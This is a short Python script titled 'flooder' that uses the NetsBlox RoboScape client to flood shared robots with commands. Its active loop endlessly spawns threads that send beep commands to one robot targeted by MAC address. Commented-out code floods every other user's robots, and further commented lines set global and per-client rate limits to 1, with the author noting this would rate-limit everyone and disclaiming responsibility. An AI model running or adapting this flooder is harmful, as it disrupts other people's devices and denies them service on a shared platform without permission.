#flooder
import netsblox, eNBy, threading, time, random

Client = netsblox.Client(project_name='testclient')
RoboScape = netsblox.RoboScape(client=Client)
print("Initialized RoboScape")
enby = eNBy.enby(Client, RoboScape, "37ac")

def _threadFunc(robot, **args):
    print(f'{i:<15} {enby.roboscape.send(robot, f"beep 1000 100")}')
    # i have left the below here in case you want to contribute to rate limiting everyone.
    # i disclaim all responsibility for any issues that may arise from this.
    # but....it is possible.
    # print(f'{i:<15} {enby.roboscape.send(robot, f"set total rate 1")}')
    # print(f'{i:<15} {enby.roboscape.send(robot, f"set client rate 1 30")}')
threads = []
i = 0

# enable this for flooding a command to all robots
# while True:
#     for robot in enby.getOthers():
#        i+=1
#        t = threading.Thread(target=_threadFunc, args=(robot,))
#        threads.append(t)
#        t.start()
#        time.sleep(0.005)

# enable this for flooding a specific robot (by MAC)
while True:
    i+=1
    t = threading.Thread(target=_threadFunc, args=('0004f31d4a88',))
    threads.append(t)
    t.start()
    time.sleep(0.5)